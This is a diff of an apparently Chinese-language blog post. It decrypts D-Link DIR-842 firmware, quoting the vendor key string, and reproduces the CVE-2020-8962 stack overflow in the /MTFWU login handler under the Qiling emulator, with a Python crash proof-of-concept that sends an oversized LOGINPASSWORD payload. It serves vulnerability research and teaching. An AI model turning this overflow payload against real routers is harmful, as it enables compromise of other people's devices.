@@ -168,7 +168,7 @@ layui.use('element', function(){
 撇除買一台新機器的選項，由官網提供的韌體下載可以發現<code>DIR-842</code>最舊的版本是沒加密的，看來是中間某一個版本突然加密了，也就是說我們在情況三</p>
 <p>既然是情況三那就好辦了，必定存在一個中間版本是未加密且具有加解密演算法的，除了可以一個一個下載韌體使用 <code>binwalk</code> 暴力測試外，還可以透過 <code>release note</code> 來縮小範圍</p>
 <p>下圖是 <code>DIR-842 RevC 3.13</code> 版的 <code>release note</code></p>
-<p><img src="https://i.imgur.com/HwZic2P.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/0.png" alt=""></p>
 <p>裡面提到若要升級到 3.13 版需要先安裝過度版本 <code>v3.092b03_middle</code></p>
 <p>這裡就得到了關鍵版本的線索，這個過渡版本應該就是未加密且具有加解密演算法的韌體版本</p>
 <p>由官網下載 <code>DIR-842 C1 FW v3.02_middle</code> 後要怎麼找到加解密演算的的所在呢?</p>
@@ -202,7 +202,7 @@ return get(&quot;&quot;,&quot;/runtime/chfw&quot;);
 ql = Qiling([&quot;squashfs-root/usr/sbin/encimg&quot;], &quot;squashfs-root&quot;, console=False)
 ql.run()
 </code></pre><p>簡單的三行程式碼將 <code>encimg</code> 跑起來看看，結果如下</p>
-<p><img src="https://i.imgur.com/lnC5tYF.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/1.png" alt=""></p>
 <p>可以看到出現 <code>no signature specified!</code> 的錯誤訊息之外，還有詳細的參數解釋跟剛剛的程式碼兩相對照，與一開始的猜測所差無幾</p>
 <p>到了這裡基本上解密已經不是問題了，將加密過的韌體放到 <code>squashfs-root</code> 中，並稍微改一下 python script 就可以了</p>
 <pre><code class="language-python=" data-lang="python=">from qiling import *
@@ -212,18 +212,18 @@ ql = Qiling([&quot;squashfs-root/usr/sbin/encimg&quot;, &quot;-d&quot;,
             &quot;-s&quot;, &quot;wrgac65_dlink.2015_dir842&quot;], &quot;squashfs-root&quot;, console=False)
 ql.run()
 </code></pre><p>下圖為執行前後對比，可以明顯看到原本什麼都不認得的 <code>binwalk</code> 在解密腳本執行完後，就可以正常辨識了</p>
-<p><img src="https://i.imgur.com/jCiMfH0.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/2.png" alt=""></p>
 <h3 id="reproduce-the-bug-with-qiling-framework">Reproduce the bug with Qiling Framework</h3>
 <p>根據分析文表示在 <code>/MTFWU</code> 這個路徑有 stack-based buffer overflow，詳細位置可以看原文分析，下面貼出我自己整理過的截圖</p>
-<p><img src="https://i.imgur.com/5CLF9uU.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/3.png" alt=""></p>
 <p>在 50 行處的 <code>strcpy</code> 直接將 <code>LOGINPASSWORD</code> 塞進堆疊裡並且沒有檢查長度，但是為了要走到這個路徑，還是需要分析一下前面幾個 function 像是 <code>session_check</code>, <code>read_sessions</code> 等等</p>
 <p>這裡 Qiling 就可以大顯神威了，一般來說不管是用 <a href="https://github.com/firmadyne/firmadyne">firmadyne</a> 或是 QEMU User-mode 都會面臨一些問題諸如: nvram 讀不到特定資料、特定檔案不存在、記憶體中某些資料不如預期之類雜七雜八的問題</p>
 <p>這些都可能導致程式走不到我們預期的路徑，但 Qiling 是由 python 組成的，其最大特點就是高可互動性，基本上執行韌體分析就跟 coding &amp; debug 沒兩樣，無論是下斷點或是存取記憶體資料絲毫不差</p>
 <p>舉個例子，在<code>session_check</code> 中用到<code>read_sessions</code> 用來逐一讀取 <code>/var/sessions</code> 下的檔案，<code>is_valid</code> 則用來檢查該 session 是否有效，是否有效的依據也很簡單，就是呼叫 syscall sysinfo 然後比較一下 session 中的時間大小與 uptime 誰大，這裡就需要 hook syscall sysinfo 來控制 uptime 以通過檢查</p>
-<p><img src="https://i.imgur.com/QK1vOqJ.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/4.png" alt=""></p>
 <p>通過 <code>man 2 sysinfo</code> 可以知道 <code>struct sysinfo</code> 是 64 bytes 而 uptime 就是前 4 bytes，跟逆向結果一致</p>
-<p><img src="https://i.imgur.com/MqiX9jS.png" alt=""></p>
-<p><img src="https://i.imgur.com/4y0QpbE.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/5.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/6.png" alt=""></p>
 <p>於此，我們需要加入 hook sysinfo function 的相關程式碼, 並使用 <code>python3 -c 'print(&quot;AAAA\x00&quot;+&quot;A&quot;*0xbf)' &gt; /var/session/c1</code> 建立 <code>/var/session/c1</code></p>
 <pre><code class="language-python=" data-lang="python=">def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
     ql.mem.write(sysinfo_info, b&quot;AAAA&quot;) # uptime
@@ -261,6 +261,7 @@ ql.hook_address(dump_reg, 0x41db40) # breakpoint before return
 </code></pre><p>將上面所提到的功能全部彙整到一起，就是一個可以引發 crash 的 python script 了</p>
 <pre><code class="language-python=" data-lang="python=">from qiling import *
 
+# hook function for syscall sysinfo
 def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
     ql.mem.write(sysinfo_info, b&quot;AAAA&quot;) # uptime
     regreturn = 0
@@ -275,6 +276,7 @@ def dump_reg(ql, *args, **kwargs):
             
     breakpoint()
 
+# fake stdin for sending payload
 class Fake_stdin:
     def read(self, size, *args, **kwargs):
         return b'ACTION=login&amp;LOGINPASSWORD=' + b'A' * 0x248
@@ -301,10 +303,14 @@ if __name__ == &quot;__main__&quot;:
     ql.set_syscall(&quot;sysinfo&quot;, my_syscall_sysinfo)  # syscall hook for sysinfo
     ql.set_syscall(&quot;_newselect&quot;, lambda *_: None)  # hook syscall _newselect with anonymous NOP function to avoid manual input requirement
     ql.hook_address(dump_reg, 0x41d3f0)            # breakpoint before return and dump all register
+
+    with open(&quot;squashfs-root/var/session/c1&quot;, &quot;wb+&quot;) as fh: # setup propper session file
+        fh.write(b&quot;AAAA\x00&quot; + b&quot;A&quot;*0xbf) # first four bytes is the UID in cookie
+
     ql.run()
 </code></pre><p>備註: 因為程式有使用到 <code>select</code> 等待 stdin 輸入，所以用一個空匿名函數取代掉 <code>ql_syscall__newselect</code>，讓 script 可以直接由 <code>Fake_stdin</code> 讀到 input</p>
 <p>整個不到 50 行的 python script 就可以把整個整個程式跑起來，並且斷點在 <code>0x41db40</code>，執行之後可以觀察到 <code>$fp($s8)</code> 跟 <code>$ra</code> 兩個暫存器都已經被覆蓋為 <code>AAAA</code> 了</p>
-<p><img src="https://i.imgur.com/ah3hCs6.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/7.png" alt=""></p>
 <h3 id="conclusion">Conclusion</h3>
 <p>Qiling Framework 是一個強大的跨平台且支援多架構的二進制分析工具，上面所提到的 feature 還只是冰山一角，他還有更多好用強大的功能，例如可以接上其他 debugger 像是 GDB、IDA Pro、Radare2 等，或是 partial execution 讓 Qiling 得以只執行 binary 裡面其中片段的程式碼，而不需要從頭到尾跑一遍，更多功能可以參考 <a href="https://docs.qiling.io/en/latest/">Qiling Framework Documentation</a> 或是 <a href="https://github.com/qilingframework/qiling">Github</a>，沒有意外的話，未來還會有更多 feature 被加到 Qiling Framework 中，拭目以待。</p>
 <h3 id="references">References</h3>
